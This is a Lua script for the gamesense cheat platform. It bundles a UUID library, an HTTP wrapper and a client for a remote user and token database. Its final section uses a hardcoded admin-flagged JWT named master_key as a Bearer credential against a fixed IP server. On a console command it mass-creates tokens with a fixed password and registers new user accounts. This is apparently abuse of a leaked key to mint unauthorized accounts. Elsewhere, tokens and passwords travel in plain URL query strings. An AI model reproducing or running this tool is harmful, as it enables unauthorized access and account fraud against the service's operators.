-- 业务层依赖的http库(gamesense api实现, 依赖$.AsyncWebRequest)
-- 防止简单方法替换
local function uuid_lib()
	---------------------------------------------------------------------------------------
-- Copyright 2012 Rackspace (original), 2013 Thijs Schreijer (modifications)
--
-- Licensed under the Apache License, Version 2.0 (the "License");
-- you may not use this file except in compliance with the License.
-- You may obtain a copy of the License at
--
--     http://www.apache.org/licenses/LICENSE-2.0
--
-- Unless required by applicable law or agreed to in writing, software
-- distributed under the License is distributed on an "AS-IS" BASIS,
-- WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
-- See the License for the specific language governing permissions and
-- limitations under the License.
--
-- see http://www.ietf.org/rfc/rfc4122.txt
--
-- Note that this is not a true version 4 (random) UUID.  Since `client.timestamp()` precision is only 1 second, it would be hard
-- to guarantee spacial uniqueness when two hosts generate a uuid after being seeded during the same second.  This
-- is solved by using the node field from a version 1 UUID.  It represents the mac address.
--
-- 28-apr-2013 modified by Thijs Schreijer from the original [Rackspace code](https://github.com/kans/zirgo/blob/807250b1af6725bad4776c931c89a784c1e34db2/util/uuid.lua) as a generic Lua module.
-- Regarding the above mention on `client.timestamp()`; the modifications use the `socket.gettime()` function from LuaSocket
-- if available and hence reduce that problem (provided LuaSocket has been loaded before uuid).
--
-- **6-nov-2015 Please take note of this issue**; [https://github.com/Mashape/kong/issues/478](https://github.com/Mashape/kong/issues/478)
-- It demonstrates the problem of using time as a random seed. Specifically when used from multiple processes.
-- So make sure to seed only once, application wide. And to not have multiple processes do that
-- simultaneously (like nginx does for example).

local M = {}
local math = require('math')
local string = require('string')

local bitsize = 32  -- bitsize assumed for Lua VM. See randomseed function below.
local lua_version = tonumber(_VERSION:match("%d%.*%d*"))  -- grab Lua version used

local MATRIX_AND = {{0,0},{0,1} }
local MATRIX_OR = {{0,1},{1,1}}
local HEXES = '0123456789abcdef'

local math_floor = math.floor
local math_random = math.random
local math_abs = math.abs
local string_sub = string.sub
local to_number = tonumber
local assert = assert
local type = type

-- performs the bitwise operation specified by truth matrix on two numbers.
local function BITWISE(x, y, matrix)
  local z = 0
  local pow = 1
  while x > 0 or y > 0 do
    z = z + (matrix[x%2+1][y%2+1] * pow)
    pow = pow * 2
    x = math_floor(x/2)
    y = math_floor(y/2)
  end
  return z
end

local function INT2HEX(x)
  local s,base = '',16
  local d
  while x > 0 do
    d = x % base + 1
    x = math_floor(x/base)
    s = string_sub(HEXES, d, d)..s
  end
  while #s < 2 do s = "0" .. s end
  return s
end

----------------------------------------------------------------------------
-- Creates a new uuid. Either provide a unique hex string, or make sure the
-- random seed is properly set. The module table itself is a shortcut to this
-- function, so `my_uuid = uuid.new()` equals `my_uuid = uuid()`.
--
-- For proper use there are 3 options;
--
-- 1. first require `luasocket`, then call `uuid.seed()`, and request a uuid using no
-- parameter, eg. `my_uuid = uuid()`
-- 2. use `uuid` without `luasocket`, set a random seed using `uuid.randomseed(some_good_seed)`,
-- and request a uuid using no parameter, eg. `my_uuid = uuid()`
-- 3. use `uuid` without `luasocket`, and request a uuid using an unique hex string,
-- eg. `my_uuid = uuid(my_networkcard_macaddress)`
--
-- @return a properly formatted uuid string
-- @param hwaddr (optional) string containing a unique hex value (e.g.: `00:0c:29:69:41:c6`), to be used to compensate for the lesser `math_random()` function. Use a mac address for solid results. If omitted, a fully randomized uuid will be generated, but then you must ensure that the random seed is set properly!
-- @usage
-- local uuid = require("uuid")
-- print("here's a new uuid: ",uuid())
function M.new(hwaddr)
  -- bytes are treated as 8bit unsigned bytes.
  local bytes = {
      math_random(0, 255),
      math_random(0, 255),
      math_random(0, 255),
      math_random(0, 255),
      math_random(0, 255),
      math_random(0, 255),
      math_random(0, 255),
      math_random(0, 255),
      math_random(0, 255),
      math_random(0, 255),
      math_random(0, 255),
      math_random(0, 255),
      math_random(0, 255),
      math_random(0, 255),
      math_random(0, 255),
      math_random(0, 255)
    }

  if hwaddr then
    assert(type(hwaddr)=="string", "Expected hex string, got "..type(hwaddr))
    -- Cleanup provided string, assume mac address, so start from back and cleanup until we've got 12 characters
    local i,str = #hwaddr, hwaddr
    hwaddr = ""
    while i>0 and #hwaddr<12 do
      local c = str:sub(i,i):lower()
      if HEXES:find(c, 1, true) then
        -- valid HEX character, so append it
        hwaddr = c..hwaddr
      end
      i = i - 1
    end
    assert(#hwaddr == 12, "Provided string did not contain at least 12 hex characters, retrieved '"..hwaddr.."' from '"..str.."'")

    -- no split() in lua. :(
    bytes[11] = to_number(hwaddr:sub(1, 2), 16)
    bytes[12] = to_number(hwaddr:sub(3, 4), 16)
    bytes[13] = to_number(hwaddr:sub(5, 6), 16)
    bytes[14] = to_number(hwaddr:sub(7, 8), 16)
    bytes[15] = to_number(hwaddr:sub(9, 10), 16)
    bytes[16] = to_number(hwaddr:sub(11, 12), 16)
  end

  -- set the version
  bytes[7] = BITWISE(bytes[7], 0x0f, MATRIX_AND)
  bytes[7] = BITWISE(bytes[7], 0x40, MATRIX_OR)
  -- set the variant
  bytes[9] = BITWISE(bytes[7], 0x3f, MATRIX_AND)
  bytes[9] = BITWISE(bytes[7], 0x80, MATRIX_OR)
  return INT2HEX(bytes[1])..INT2HEX(bytes[2])..INT2HEX(bytes[3])..INT2HEX(bytes[4]).."-"..
         INT2HEX(bytes[5])..INT2HEX(bytes[6]).."-"..
         INT2HEX(bytes[7])..INT2HEX(bytes[8]).."-"..
         INT2HEX(bytes[9])..INT2HEX(bytes[10]).."-"..
         INT2HEX(bytes[11])..INT2HEX(bytes[12])..INT2HEX(bytes[13])..INT2HEX(bytes[14])..INT2HEX(bytes[15])..INT2HEX(bytes[16])
end

----------------------------------------------------------------------------
-- Improved randomseed function.
-- Lua 5.1 and 5.2 both truncate the seed given if it exceeds the integer
-- range. If this happens, the seed will be 0 or 1 and all randomness will
-- be gone (each application run will generate the same sequence of random
-- numbers in that case). This improved version drops the most significant
-- bits in those cases to get the seed within the proper range again.
-- @param seed the random seed to set (integer from 0 - 2^32, negative values will be made positive)
-- @return the (potentially modified) seed used
-- @usage
-- local socket = require("socket")  -- gettime() has higher precision than client.timestamp()
-- local uuid = require("uuid")
-- -- see also example at uuid.seed()
-- uuid.randomseed(socket.gettime()*10000)
-- print("here's a new uuid: ",uuid())
function M.randomseed(seed)
  seed = math_floor(math_abs(seed))
  if seed >= (2^bitsize) then
    -- integer overflow, so reduce to prevent a bad seed
    seed = seed - math_floor(seed / 2^bitsize) * (2^bitsize)
  end
  if lua_version < 5.2 then
    -- 5.1 uses (incorrect) signed int
    math.randomseed(seed - 2^(bitsize-1))
  else
    -- 5.2 uses (correct) unsigned int
    math.randomseed(seed)
  end
  return seed
end

----------------------------------------------------------------------------
-- Seeds the random generator.
-- It does so in 2 possible ways;
--
-- 1. use `client.timestamp()`: this only offers resolution to one second (used when
-- LuaSocket hasn't been loaded yet
-- 2. use luasocket `gettime()` function, but it only does so when LuaSocket
-- has been required already.
-- @usage
-- local socket = require("socket")  -- gettime() has higher precision than client.timestamp()
-- -- LuaSocket loaded, so below line does the same as the example from randomseed()
-- uuid.seed()
-- print("here's a new uuid: ",uuid())
function M.seed()
  if package.loaded["socket"] and package.loaded["socket"].gettime then
    return M.randomseed(package.loaded["socket"].gettime()*10000)
  else
    return M.randomseed(client.timestamp())
  end
end

return setmetatable( M, { __call = function(self, hwaddr) return self.new(hwaddr) end} )
end
if panorama.loadstring([[
    return function(qwq){
        return qwq + 8
    }
]])()(8) == 16 then
else
	return
end
local reqFreq = 0.5
-- region http-lib #1
local function httpHashMap()
	panorama.loadstring([[
        HashMap = function HashMap(){  
        var length = 0;  
        var obj = new Object();  
    
        this.isEmpty = function(){  
            return length == 0;  
        };  
    
        this.containsKey=function(key){  
            return (key in obj);  
        };  
     
        this.containsValue=function(value){  
            for(var key in obj){  
                if(obj[key] == value){  
                    return true;  
                }  
            }  
            return false;  
        };  
    
        this.put=function(key,value){  
            if(!this.containsKey(key)){  
                length++;  
            }  
            obj[key] = value;  
        };  
    
        this.get=function(key){  
            return this.containsKey(key)?obj[key]:null;  
        };  
     
        this.remove=function(key){  
            if(this.containsKey(key)&&(delete obj[key])){  
                length--;  
            }  
        };  
     
        this.values=function(){  
            var _values= new Array();  
            for(var key in obj){  
                _values.push(obj[key]);  
            }  
            return _values;  
        };  
     
        this.keySet=function(){  
            var _keys = new Array();  
            for(var key in obj){  
                _keys.push(key);  
            }  
            return _keys;  
        };  
    
        this.size = function(){  
            return length;  
        };  
     
        this.clear = function(){  
            length = 0;  
            obj = new Object();  
        };  
    }  ]])()
	local data = {}
	local http = {}
	local http_lut = panorama.loadstring([[
        http_lut = new HashMap()
        return http_lut
    ]])()
	local function uuid(len)
		local res, len = "", len or 24
		for i = 1, len do
			res = res .. string.char(client.random_int(97, 122))
		end
		return res
	end

	local netFunc = panorama.loadstring([[
        //Credit baka
        var _create_http_req = function(type, url, data, id, header){	
            http_lut.put(id, "requesting");
            let send = {
                type: type, 
                data: data,
                complete: function(c){http_lut.put(id, c.responseText);} , 
                timeout: 60000, 
                headers: header,
            };
            $.AsyncWebRequest(url, send)
        }
        return _create_http_req
    ]])()
	function http.create(type, URI, req_data, header, callback)
		local obj = {["type"] = type, ["handle"] = URI, ["data"] = req_data or {}, ["callback"] = callback, ["reqNum"] = uuid(), ["headers"] = header}
		table.insert(data, obj)
	end
	function http.get(URI, callback)
		local obj = {["type"] = 'GET', ["handle"] = URI, ["data"] = {}, ["callback"] = callback, ["reqNum"] = uuid(), ["headers"] = {}}
		table.insert(data, obj)
	end
	function http.post(URI, req_data, callback)
		local obj = {["type"] = 'POST', ["handle"] = URI, ["data"] = req_data or {}, ["callback"] = callback, ["reqNum"] = uuid(), ["headers"] = {}}
		table.insert(data, obj)
	end
	function http.post_header(URI, req_data, header, callback)
		local obj = {["type"] = 'POST', ["handle"] = URI, ["data"] = req_data or {}, ["callback"] = callback, ["reqNum"] = uuid(), ["headers"] = header or {}}
		table.insert(data, obj)
	end
	function http.put(URI, req_data, callback)
		local obj = {["type"] = 'PUT', ["handle"] = URI .. "&data=" .. json.stringify(req_data), ["data"] = req_data or {}, ["callback"] = callback, ["reqNum"] = uuid(), ["headers"] = {_method = "PUT"}}
		table.insert(data, obj)
	end
	function http.delete(URI, req_data, callback)
		local obj = {["type"] = 'DELETE', ["handle"] = URI, ["data"] = req_data or {}, ["callback"] = callback, ["reqNum"] = uuid(), ["headers"] = {}}
		table.insert(data, obj)
	end
	function http.callback()
		for k, v in pairs(data) do
			local type = v["type"]
			local URI = v["handle"]
			local req_data = v["data"]
			local callback = v["callback"]
			local reqNum = v["reqNum"]
			local headers = v["headers"] or {}
			local body = http_lut.get(reqNum)
			if body then
				if body ~= "requesting" then
					http_lut.remove(reqNum)
					table.remove(data, k)
					callback(body)
				end
			else
				netFunc(type, URI, req_data, reqNum, headers)
			end
		end
		client.delay_call(reqFreq, http.callback)
	end
	client.delay_call(reqFreq, http.callback)
	return http
end
-- endregion

local http = httpHashMap()
local function database_base(http)
	local M = {}
	-- 返回User信息或者第一次的注册信息
	function M.getUser(token, password, callback)
		local function request_handler(ctx)
			local data = json.parse(ctx)
			if data then
				if data.statusCode == 401 and data.error == "Unauthorized" and string.sub(data.message, 1, 17) == "Token registered:" then
					local authCode = string.sub(data.message, 19, -1)
					callback({state = "registered", authCode = authCode})
				elseif data.username and data.token and data.LuaContainer then
					callback({state = "success", username = data.username, token = token, password = password, LuaContainer = data.LuaContainer, blocked = data.blocked})
				elseif data.statusCode then
					callback("error " .. data.statusCode)
				else
					callback("fatal error")
				end
			else
				callback("network error")
			end
		end
		if not password then
			http.get("http://34.96.253.102:8310/users/me?token=" .. token, request_handler)
		else
			http.get("http://34.96.253.102:8310/users/me?token=" .. token .. "&password=" .. password, request_handler)
		end
	end
	-- 查, 返回数据
	function M.findContainer(user, container_name, callback)
		http.get("http://34.96.253.102:8310/" .. container_name .. "s" .. "?token=" .. user.token .. "&password=" .. user.password, function(ctx)
			local data = json.parse(ctx)
			if data and not data.statusCode then
				callback(data)
			elseif data and data.statusCode then
				callback("error " .. data.statusCode)
			else
				callback("network or fatal error")
			end
		end)
	end
	function M.findOneContainer(user, container_name, id, callback)
		http.get("http://34.96.253.102:8310/" .. container_name .. "s/" .. id .. "?token=" .. user.token .. "&password=" .. user.password, function(ctx)
			local data = json.parse(ctx)
			if data and not data.statusCode then
				callback(data)
			elseif data and data.statusCode then
				callback("error " .. data.statusCode)
			else
				callback("network or fatal error")
			end
		end)
	end
	-- 改, 返回修改后的数据
	function M.updateOneContainer(user, container_name, id, content, callback)
		http.put("http://34.96.253.102:8310/" .. container_name .. "s/" .. id .. "?token=" .. user.token .. "&password=" .. user.password, content, function(ctx)
			local data = json.parse(ctx)
			if data and not data.statusCode then
				callback(data)
			elseif data and data.statusCode then
				callback("error " .. data.statusCode)
			else
				callback("network or fatal error")
			end
		end)
	end
	-- 增, 返回增加的数据
	function M.createContainer(user, container_name, content, callback)
		http.post("http://34.96.253.102:8310/" .. container_name .. "s" .. "?token=" .. user.token .. "&password=" .. user.password, content, function(ctx)
			local data = json.parse(ctx)
			if data and not data.statusCode then
				callback(data)
			elseif data and data.statusCode then
				callback("error " .. data.statusCode)
			else
				callback("network or fatal error")
			end
		end)
	end
	-- 删, 返回删除的数据
	function M.deleteOneContainer(user, container_name, id, callback)
		http.delete("http://34.96.253.102:8310/" .. container_name .. "s/" .. id .. "?token=" .. user.token .. "&password=" .. user.password, function(ctx)
			local data = json.parse(ctx)
			if data and not data.statusCode then
				callback(data)
			elseif data and data.statusCode then
				callback("error " .. data.statusCode)
			else
				callback("network or fatal error")
			end
		end)
	end
	return M
end

local db = database_base(http)
local uuid = uuid_lib()
local function uuid_num(len)
    local res, len = "", len or 32
    for i=1, len do
        res = res .. string.char(client.random_int(97, 122))
    end
    return res
end
local function block_user(user, id, callback)
	db.updateOneContainer(user, "user", id, {blocked = true}, callback)
end

local function create_token(user, token, password, callback)
	db.createContainer(user, "token", {
		token = token,
		password = password,
		user = "" -- id only
	}, callback)
end

local function findLuaContainer(user, callback)
	db.findContainer(user, user.LuaContainer, callback)
end

local master_key = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNjA1OTE3OTg1LCJleHAiOjE2MDg1MDk5ODV9.p6dIxuZ-0dg53vTBCoEWux_UuIhTxqkkkKq5X54oPWE"

local a = database.read("TEST")
if a == nil then
	xt = 1
else
	xt = a + 1
end
x = "%d%s"
x = x:format(xt+1,"@gmail.com")
database.write("TEST",xt)

local tokens_created = {}
local function createToken()
	local token = uuid_num(32)
	local password = "YuDiTheGod"
	local construct = {
		token = token,
		password = password,
	}
	http.post_header("http://3.21.122.196:8310/tokens", construct, {Authorization = "Bearer "..master_key}, function(ctx)
		local data = json.parse(ctx)
		if data and data.id then
			table.insert(tokens_created, data)
		end
	end)
end
local function mergeUserToken(username, email, password, config, lua, token_data)
	local token_id = token_data.id
	local construct = {
		username = username,
  		email = x,
  		password = password,
		role = 7,
		confirmed = false,
  		blocked = false,
  		config = "1",
  		token = token_id,
  		LuaContainer = "1"
	}
	http.post_header("http://3.21.122.196:8310/users", construct, {Authorization = "Bearer "..master_key}, function (ctx)
		local data = json.parse(ctx)
		if data and data.statusCode then
			print(ctx)
		end
		if data and data.id and data.token then
			client.color_log(100,255,100,"User:"..data.username)
			client.color_log(255,100,100,data.token.token)
			client.reload_active_scripts()
		end
	end)
end
local function createUser(username, email, password, config, lua)
	for _, token_data in pairs(tokens_created) do
		mergeUserToken(username, email, password, config, lua, token_data)
		table.remove(tokens_created, _)
	end
end
local token_label = ui.new_label("LUA", "A", "Current tokens : ")
client.set_event_callback("paint_ui", function()
	ui.set(token_label, "Current tokens : "..#tokens_created)
end)
client.set_event_callback("console_input",function(cmd)
	if cmd == "tk" then
		createToken()
		print("Token Gened")
		client.delay_call(1,function()
			client.set_event_callback("console_input",function(cmds)
				local username = cmds
				local password = uuid_num(16)
				createUser(username, email, password, config, lua)
				print("User Reged")	
			end)
		end)
	end
end)
